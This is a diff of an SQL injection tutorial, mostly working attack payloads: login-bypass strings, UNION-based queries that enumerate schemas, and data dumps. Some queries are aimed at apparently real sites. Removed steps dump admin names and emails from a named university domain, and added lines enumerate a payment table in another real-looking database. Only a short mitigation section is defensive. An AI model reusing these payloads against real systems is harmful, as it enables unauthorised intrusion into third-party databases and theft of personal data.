@@ -37,10 +37,8 @@ Used specifically to bypass login mechanisms.
 Allows login without valid credentials.
 
 Example payload: 
-' OR 1=1--,
-" OR 1=1 #
-') OR 1=1 #
-") OR 1=1 #
+' OR 1=1-- -
+
 
 NOTE: These payloads are injected into username or password fields to bypass authentication by manipulating SQL logic.
 
@@ -86,82 +84,21 @@ id=-1' UNION ALL SELECT 1,database(),version()--+
 
 This reveals the current database name and database server version
 
+#All tables enumerate
+(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x626c7363626f6772615f77656273697465)
 
+#Colomuns enemurate from specific table
+(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x6564755f7061796d656e745f6e6f63)
 
+#Dump data from specific table and column
+(SELECT+GROUP_CONCAT(modify_date+SEPARATOR+0x3c62723e)+FROM+blscbogra_website .edu_payment_noc)
 
-                                                                      Setup Cyberfox + HackBar for Manual SQL Injection Testing
-
-Step 5: Download Cyberfox Browser
-
-Cyberfox is a privacy-focused browser suitable for isolated security testing environments.
-
-Download: https://sourceforge.net/projects/cyberfox/
-
-
-Step 6: Download HackBar (.xpi) Extension
-
-HackBar is a browser extension used for manual SQL Injection, XSS, LFI, and other web vulnerability testing.
-
-Download: https://github.com/emyounoone/Hackbar
-
-
-Step 7: Install HackBar (.xpi) in Cyberfox
-
-Since Cyberfox does not support automatic add-on installation, HackBar must be installed manually.
-
-Installation Guide (Video): https://drive.google.com/file/d/13kJWkfBzZ6AQy-1SzUQ4yXSvOenDkKy4/view?usp=drivesdk
+                                                                      
 
 
                                                                                          
-                                                                                             Exploitation
+                                                                              POST-Based SQL Injection Exploitation (Login Form)
 
-
-
-Step 8: Extract All Table Names from a Specific Database
-After identifying the number of columns and injectable columns, extract all table names from a target database using INFORMATION_SCHEMA.
-
-Payload:https://www.juc.edu.bd/page.php?id=-5' UNION ALL SELECT 
-1,2,3,
-(SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e)
-FROM INFORMATION_SCHEMA.TABLES
-WHERE TABLE_SCHEMA=0x6578706c6f726565696d735f6a75636564755f6473616466),
-5,6,7,8,9,10,11,12,13--+
-
-NOTE: This payload was generated using the HackBar extension in the Cyberfox browser by utilizing the table enumeration feature and injecting it into a vulnerable column
-
-
-
-
-Step 9: Extract All Column Names from a Specific Table
-After identifying the database and table names, extract all column names from a target table using INFORMATION_SCHEMA.
-
-Payload:https://www.juc.edu.bd/page.php?id=-5' UNION ALL SELECT 
-1,2,3,
-(SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c62723e)
-FROM INFORMATION_SCHEMA.COLUMNS
-WHERE TABLE_NAME=0x61646d696e),
-5,6,7,8,9,10,11,12,13--+
-
-Note:This payload was generated using the Cyberfox browser with the HackBar extension, leveraging the Column Enumeration feature and injected into a vulnerable column.
-
-
-
-Step 10: Dump Data from a Specific Database, Table, and Columns
-After identifying the database, table, and column names, extract sensitive data using a UNION-based SQL Injection payload.
-
-Payload:https://www.juc.edu.bd/page.php?id=-5' UNION ALL SELECT 
-1,2,3,
-(SELECT GROUP_CONCAT(fullname,email SEPARATOR 0x3c62723e)
-FROM exploreeims_jucedu_dsadf.tbl_admin),
-5,6,7,8,9,10,11,12,13--+
-
-Note:This payload was generated using the Cyberfox browser with the HackBar extension, utilizing the Data Enumeration feature and injected into a vulnerable column.
-
-
-
-                                                                          
-
-                                                                           POST-Based SQL Injection Exploitation (Login Form)
 This technique targets POST parameters (e.g., username/password) instead of URL parameters.
 
 
@@ -199,7 +136,10 @@ Note : This exploitation was performed on a POST-based login form.
 
 
                                                                            
-                                                                       Automatic Tools Use for SQL Injection
+                                                                          Automatic Tools Use for SQL Injection
+
+
+#SqlMap Command Generator: https://sqlmap.m14r41.in/
 
 TOOl 1 SQLMAP :
 
@@ -331,7 +271,6 @@ Download Payload File:wget https://raw.githubusercontent.com/jahithoque/BSQLi-fr
 Usage:python3 lostsec.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -p payloads/xor.txt
 
 
-
 Tool 2:https://github.com/mhaskar/Blinder
 
 
@@ -390,19 +329,6 @@ Helps detect and block common SQLi payloads.
 6. Regular Security Testing
 Perform manual testing and automated scans.
 Use tools like sqlmap, Burp Suite, OWASP ZAP on authorized targets.
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
